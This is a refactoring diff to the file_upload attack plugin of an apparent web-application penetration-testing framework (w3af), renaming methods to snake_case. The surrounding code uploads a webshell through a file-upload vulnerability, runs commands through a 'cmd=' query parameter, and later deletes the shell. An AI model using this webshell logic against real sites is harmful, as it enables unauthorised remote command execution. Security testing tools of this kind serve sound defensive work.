@@ -55,14 +55,14 @@ class file_upload(AttackPlugin):
         self._path_name = ''
         self._file_name = ''
         
-        # User configured variables ( for fastExploit )
+        # User configured variables ( for fast_exploit )
         self._url = 'http://host.tld/'
         self._method = 'POST'
         self._data = ''
         self._fileVars = ''
         self._fileDest = ''
 
-    def fastExploit( self ):
+    def fast_exploit( self ):
         '''
         Exploits a web app with file upload vuln.
         '''
@@ -78,13 +78,13 @@ class file_upload(AttackPlugin):
             v['fileDest'] = self._fileDest
             kb.kb.append( 'file_upload', 'file_upload', v )
 
-    def getAttackType(self):
+    def get_attack_type(self):
         '''
         @return: The type of exploit, SHELL, PROXY, etc.
         '''        
         return 'shell'
 
-    def getVulnName2Exploit( self ):
+    def get_kb_location( self ):
         '''
         This method should return the vulnerability name (as saved in the kb) to exploit.
         For example, if the audit.os_commanding plugin finds an vuln, and saves it as:
@@ -107,7 +107,7 @@ class file_upload(AttackPlugin):
             # Set shell parameters
             shell_obj = fuShell( vuln_obj )
             shell_obj.set_url_opener( self._uri_opener )
-            shell_obj.setExploitURL( self._exploit )
+            shell_obj.set_exploit_URL( self._exploit )
             return shell_obj
         else:
             return None
@@ -184,19 +184,19 @@ class file_upload(AttackPlugin):
         '''
         @return: A list of option objects for this plugin.
         '''
-        d1 = 'URL to exploit with fastExploit()'
+        d1 = 'URL to exploit with fast_exploit()'
         o1 = opt_factory('url', self._url, d1, 'url')
         
-        d2 = 'Method to use with fastExploit()'
+        d2 = 'Method to use with fast_exploit()'
         o2 = opt_factory('method', self._method, d2, 'string')
 
-        d3 = 'Data to send with fastExploit()'
+        d3 = 'Data to send with fast_exploit()'
         o3 = opt_factory('data', self._data, d3, 'string')
 
-        d4 = 'The variable in data that holds the file content. Only used in fastExploit()'
+        d4 = 'The variable in data that holds the file content. Only used in fast_exploit()'
         o4 = opt_factory('fileVars', self._fileVars, d4, 'string')
 
-        d5 = 'The URI of the uploaded file. Only used with fastExploit()'
+        d5 = 'The URI of the uploaded file. Only used with fast_exploit()'
         o5 = opt_factory('fileDest', self._fileDest, d5, 'string')
         
         ol = OptionList()
@@ -221,7 +221,7 @@ class file_upload(AttackPlugin):
         self._fileVars = options_list['fileVars'].get_value()
         self._fileDest = options_list['fileDest'].get_value()
 
-    def getRootProbability( self ):
+    def get_root_probability( self ):
         '''
         @return: This method returns the probability of getting a root shell
                  using this attack plugin. This is used by the "exploit *"
@@ -245,10 +245,10 @@ class file_upload(AttackPlugin):
         '''
 
 class fuShell(exec_shell):
-    def setExploitURL( self, eu ):
+    def set_exploit_URL( self, eu ):
         self._exploit = eu
     
-    def getExploitURL( self ):
+    def get_exploit_URL( self ):
         return self._exploit
     
     @exec_debug
@@ -262,14 +262,14 @@ class fuShell(exec_shell):
         @param command: The command to handle ( ie. "read", "exec", etc ).
         @return: The result of the command.
         '''
-        to_send = self.getExploitURL()
+        to_send = self.get_exploit_URL()
         to_send.querystring = u'cmd=' + command
         response = self._uri_opener.GET( to_send )
         return response.getBody()
         
     def end( self ):
         om.out.debug('File upload shell is going to delete the webshell that was uploaded before.')
-        file_to_del = self.getExploitURL().getFileName()
+        file_to_del = self.get_exploit_URL().getFileName()
         try:
             self.unlink(file_to_del)
         except w3afException, e:
